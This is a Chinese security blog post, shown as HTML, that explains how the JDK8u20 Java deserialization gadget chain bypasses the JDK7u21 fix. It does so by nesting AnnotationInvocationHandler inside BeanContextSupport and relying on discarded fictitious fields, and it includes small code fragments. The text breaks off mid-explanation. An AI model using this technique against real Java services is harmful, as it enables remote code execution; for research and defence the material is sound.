<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='JDK8u20这条链子实际上是JDK7u21链子的高版本绕过，利用链都是一致的，因此我们只关注对AnnotationInvocationHa'>
<title>JDK8u20原生链</title>

<link rel='canonical' href='/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/'>

<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='JDK8u20原生链'>
<meta property='og:description' content='JDK8u20这条链子实际上是JDK7u21链子的高版本绕过，利用链都是一致的，因此我们只关注对AnnotationInvocationHa'>
<meta property='og:url' content='/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/'>
<meta property='og:site_name' content='0ZHan&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Java安全' /><meta property='article:published_time' content='2024-03-25T19:43:24&#43;08:00'/><meta property='article:modified_time' content='2024-03-25T19:43:24&#43;08:00'/>
<meta name="twitter:title" content="JDK8u20原生链">
<meta name="twitter:description" content="JDK8u20这条链子实际上是JDK7u21链子的高版本绕过，利用链都是一致的，因此我们只关注对AnnotationInvocationHa">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-G42YH9J7M8"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-G42YH9J7M8', { 'anonymize_ip': false });
}
</script>

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/1000_huac81c2698ed7f4f7ac0962c570fafca4_51159_300x0_resize_box_3.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">0ZHan&#39;s Blog</a></h1>
            <h2 class="site-description">才须学也</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href=''
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href=''
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>主页</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>归档</span>
            </a>
        </li>
        
        

        <li >
            <a href='/tags/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
  <circle cx="9" cy="9" r="2" />
</svg>



                
                <span>标签</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>搜索</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>暗色模式</span>
                </li>
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li>
      <ol>
        <li><a href="#jdk7u21链的修复及绕过思路">JDK7u21链的修复及绕过思路</a>
          <ol>
            <li><a href="#try-catch嵌套">try-catch嵌套</a></li>
            <li><a href="#成员抛弃机制">成员抛弃机制</a></li>
          </ol>
        </li>
        <li><a href="#序列化协议浅析">序列化协议浅析</a></li>
        <li><a href="#手搓jdk7u21链">手搓JDK7u21链</a></li>
        <li><a href="#构造jdk8u20链">构造JDK8u20链</a>
          <ol>
            <li></li>
          </ol>
        </li>
        <li><a href="#构造poc的其他思路">构造POC的其他思路</a></li>
        <li><a href="#高版本修复">高版本修复</a></li>
        <li><a href="#参考链接">参考链接</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/">JDK8u20原生链</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Mar 25, 2024</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    阅读时长: 14 分钟
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p><code>JDK8u20</code>这条链子实际上是<code>JDK7u21</code>链子的高版本绕过，利用链都是一致的，因此我们只关注对<code>AnnotationInvocationHandler</code>的高版本绕过</p>
<h3 id="jdk7u21链的修复及绕过思路">JDK7u21链的修复及绕过思路</h3>
<p>为了修复<code>JDK7u21</code>链，高版本<code>JDK</code>在<code>AnnotationInvocationHandler.readObject()</code>方法中校验了<code>type</code>类型</p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602161813494.png"
	width="1195"
	height="392"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602161813494_hub137155140e88e49330e97a1706d4639_53251_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602161813494_hub137155140e88e49330e97a1706d4639_53251_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602161813494"
	
	
		class="gallery-image" 
		data-flex-grow="304"
		data-flex-basis="731px"
	
></p>
<p>如果<code>type</code>类型为<code>Tempaltes.class</code>，就会抛出异常，终止程序运行&hellip;</p>
<p>但是由于<code>AnnotationInvocationHandler.readObject</code> 是先调用 <code>s.defaultReadObject</code>方法 ，再抛出异常的</p>
<p>因此<code>AnnotationInvocationHandler</code>对象在抛出异常之前就被反序列化出来了，所以如果我们能够避免下面的异常终止程序运行，就能重新走<code>JDK7u21</code>链</p>
<h4 id="try-catch嵌套">try-catch嵌套</h4>
<p>我们知道 <code>try-catch</code> 是<code>Java</code>处理异常的标准语句，其中<code>catch</code>用于捕获并处理异常</p>
<p>为了避免<code>AnnotationInvocationHandler</code>抛出的<code>InvaildObjectException</code>中断程序执行，我们可以找一个<code>catch</code>语句，它能捕获<code>InvaildObjectException</code>异常且不抛出新的异常，这样就能程序继续运行下去</p>
<p><strong>例如</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">main</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">try</span><span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">RuntimeException</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;error!&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span><span style="color:#c678dd">catch</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Exception</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">){</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">out</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">println</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;A piece of cake!&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">out</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">println</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;I&#39;m still Running!&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p><strong>BeanContextSupport.readObject</strong></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602203135120.png"
	width="1197"
	height="422"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602203135120_hua62863e19ffb97357b89b0bf66c389fa_51135_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602203135120_hua62863e19ffb97357b89b0bf66c389fa_51135_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602203135120"
	
	
		class="gallery-image" 
		data-flex-grow="283"
		data-flex-basis="680px"
	
></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602203153390.png"
	width="1200"
	height="421"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602203153390_huaced2dd8e1099cd276e5a68c8c3583d0_51031_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602203153390_huaced2dd8e1099cd276e5a68c8c3583d0_51031_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602203153390"
	
	
		class="gallery-image" 
		data-flex-grow="285"
		data-flex-basis="684px"
	
></p>
<p>可以看到<code>readChildren()</code>会尝试反序列化<code>ois</code>流，如果捕获了<code>IOException</code>就调用<code>continue</code>跳过（<code>InvalidObjectException</code>继承自<code>IOException</code>），所以只要能让 <code>BeanContextSupport</code> 反序列化 <code>AnnotationInvocationHandler</code>，就能绕过异常的影响</p>
<p>那么问题来了，<code>AnnotationInvocationHandler</code>应该在放在<code>BeanContextSupport</code>的那个地方呢？</p>
<p>找他的位置很简单，与<code>readChildren</code>相对的就是<code>writeChildren</code>方法</p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602220042238.png"
	width="1198"
	height="296"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602220042238_hu35a209ad231f285ced0ab92812759346_32926_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602220042238_hu35a209ad231f285ced0ab92812759346_32926_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602220042238"
	
	
		class="gallery-image" 
		data-flex-grow="404"
		data-flex-basis="971px"
	
></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602220123001.png"
	width="1200"
	height="424"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602220123001_hud2a622e063d8041f70d5cf672090e523_43457_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602220123001_hud2a622e063d8041f70d5cf672090e523_43457_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602220123001"
	
	
		class="gallery-image" 
		data-flex-grow="283"
		data-flex-basis="679px"
	
></p>
<p>可以看到这里往输出流中写入了<code>children</code>的<code>key</code>，由于<code>chidlren</code>是一个<code>HashMap</code>，因此直接找调用<code>children.put</code>的方法即可</p>
<p>于是找到了<code>add</code>方法</p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602220751141.png"
	width="1197"
	height="342"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602220751141_hu11fcdee5444868609c60c66dfb777e1d_47061_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602220751141_hu11fcdee5444868609c60c66dfb777e1d_47061_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602220751141"
	
	
		class="gallery-image" 
		data-flex-grow="350"
		data-flex-basis="840px"
	
></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602220851968.png"
	width="1194"
	height="428"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602220851968_hu73973d50cf9e7f1f310dbca6b1b5fd05_50305_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602220851968_hu73973d50cf9e7f1f310dbca6b1b5fd05_50305_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602220851968"
	
	
		class="gallery-image" 
		data-flex-grow="278"
		data-flex-basis="669px"
	
></p>
<p>可以用<code>add</code>方法来向<code>BeanContextSupport</code>写入<code>AnnotationInvocationHandler</code></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        <span style="color:#e06c75">BeanContextSupport</span> <span style="color:#e06c75">beanContextSupport</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">BeanContextSupport</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">beanContextSupport</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">add</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">annotationHandlerInvocationHandler</span><span style="color:#56b6c2">);</span>
</span></span></code></pre></div><p>通过观察<code>BeanContextSupport</code>序列化的结构，我们会发现其实<code>AnnotationInvocationHandler</code>就在<code>objectAnnotation</code>数据块内，属于额外写入的数据</p>
<p>因此我们只要向<code>BeanContextSupport</code>的<code>objectAnnotation</code>区域写入<code>AnnotationInvocationHandler</code>，就可以绕过<code>AnnotationInvocationHandler</code>反序列化的限制</p>
<p>不过 <code>BeanContextSupport</code> 并不能直接写入到 <code>JDK7u21</code>链中，所以接下来我们考虑如何将 <code>BeanContextSupport</code> 拼接到 <code>JDK7u21</code>链中</p>
<p>我这里是采用了<code>pwntester</code>师傅的思路（比较好理解），利用<strong>成员抛弃机制</strong>，将<code>BeanContextSupport</code>作为成员变量写入到<code>Proxy</code>中</p>
<h4 id="成员抛弃机制">成员抛弃机制</h4>
<p><code>Java</code>在反序列化对象时，如果遇到了不存在的虚构成员，会正常将其反序列化并分配<code>Handle</code>（虚构成员是对象的情况下），但是当该对象被反序列化完成时，虚构成员会被抛弃</p>
<p><strong>具体细节</strong></p>
<p><strong>ObjectInputStream.readObject0</strong></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170036783.png"
	width="1199"
	height="66"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170036783_huc652db4014ddfc4a06a65864ff7ad20b_8972_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170036783_huc652db4014ddfc4a06a65864ff7ad20b_8972_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602170036783"
	
	
		class="gallery-image" 
		data-flex-grow="1816"
		data-flex-basis="4360px"
	
></p>
<p><strong>ObjectInputStream.readOrdinaryObject</strong></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170115586.png"
	width="1201"
	height="251"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170115586_huaa861c4b903f2145c666d82d9a80569d_31640_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170115586_huaa861c4b903f2145c666d82d9a80569d_31640_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602170115586"
	
	
		class="gallery-image" 
		data-flex-grow="478"
		data-flex-basis="1148px"
	
></p>
<p><strong>ObjectInputStream.readClassDesc</strong></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170207897.png"
	width="1196"
	height="442"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170207897_huedf6c90b5d11cc1bac7ebf3c7db5ef3c_59042_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170207897_huedf6c90b5d11cc1bac7ebf3c7db5ef3c_59042_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602170207897"
	
	
		class="gallery-image" 
		data-flex-grow="270"
		data-flex-basis="649px"
	
></p>
<p><strong>ObjectInputStream.readNonProxyDesc</strong></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170348337.png"
	width="1196"
	height="318"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170348337_hu72bfc7e4973bc434233e58e5cab48b07_53275_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170348337_hu72bfc7e4973bc434233e58e5cab48b07_53275_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602170348337"
	
	
		class="gallery-image" 
		data-flex-grow="376"
		data-flex-basis="902px"
	
></p>
<p><strong>ObjectStreamClass.initNonProxy</strong></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170447137.png"
	width="1190"
	height="251"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170447137_hu3f664d1e5e2e3063571a8a91f5d7967c_40775_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170447137_hu3f664d1e5e2e3063571a8a91f5d7967c_40775_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602170447137"
	
	
		class="gallery-image" 
		data-flex-grow="474"
		data-flex-basis="1137px"
	
></p>
<p><strong>ObjectStreamClass.lookup</strong></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170517894.png"
	width="1202"
	height="362"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170517894_hube959022c38a257b694d386fcf6aaffa_36184_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170517894_hube959022c38a257b694d386fcf6aaffa_36184_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602170517894"
	
	
		class="gallery-image" 
		data-flex-grow="332"
		data-flex-basis="796px"
	
></p>
<p><strong>ObjectStreamClass</strong></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170547431.png"
	width="1201"
	height="169"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170547431_hu6b3223cf0fa5b713b4582858c110d12a_28527_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170547431_hu6b3223cf0fa5b713b4582858c110d12a_28527_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602170547431"
	
	
		class="gallery-image" 
		data-flex-grow="710"
		data-flex-basis="1705px"
	
></p>
<p><strong>ObjectStreamClass.getReflector</strong></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170634726.png"
	width="1196"
	height="375"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170634726_hu85206e66c458fe884726deb5f83d4c62_50588_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602170634726_hu85206e66c458fe884726deb5f83d4c62_50588_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602170634726"
	
	
		class="gallery-image" 
		data-flex-grow="318"
		data-flex-basis="765px"
	
></p>
<p><strong>FieldReflector</strong></p>
<p><code>fields</code>  即上面  <code>matchFileds()</code>  方法获得的真实成员变量</p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602171937544.png"
	width="1195"
	height="263"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602171937544_hu44a227f30db1e2ebf374c933af16cb57_81715_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602171937544_hu44a227f30db1e2ebf374c933af16cb57_81715_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602171937544"
	
	
		class="gallery-image" 
		data-flex-grow="454"
		data-flex-basis="1090px"
	
></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602172151290.png"
	width="1196"
	height="391"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602172151290_hube14d3b45ae5bdf747b37210f28ecbeb_116980_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602172151290_hube14d3b45ae5bdf747b37210f28ecbeb_116980_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602172151290"
	
	
		class="gallery-image" 
		data-flex-grow="305"
		data-flex-basis="734px"
	
></p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602172333570.png"
	width="1194"
	height="341"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602172333570_hu2eb0f4117cc60fd37abe861fdc057de5_40684_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602172333570_hu2eb0f4117cc60fd37abe861fdc057de5_40684_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602172333570"
	
	
		class="gallery-image" 
		data-flex-grow="350"
		data-flex-basis="840px"
	
></p>
<p>可以看到虚构成员变量对应<code>writeKeys</code>的值为<code>-1</code></p>
<p>在后续的<code>ObjectStreamClass.setFiledValues()</code>方法中，<code>writeKeys[i] == -1</code>的成员变量会被抛弃</p>
<p><img src="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602172702369.png"
	width="1188"
	height="281"
	srcset="/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602172702369_huc734469a4d86d1dca6d8afeec3db2e40_63847_480x0_resize_box_3.png 480w, /p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20230602172702369_huc734469a4d86d1dca6d8afeec3db2e40_63847_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20230602172702369"
	
	
		class="gallery-image" 
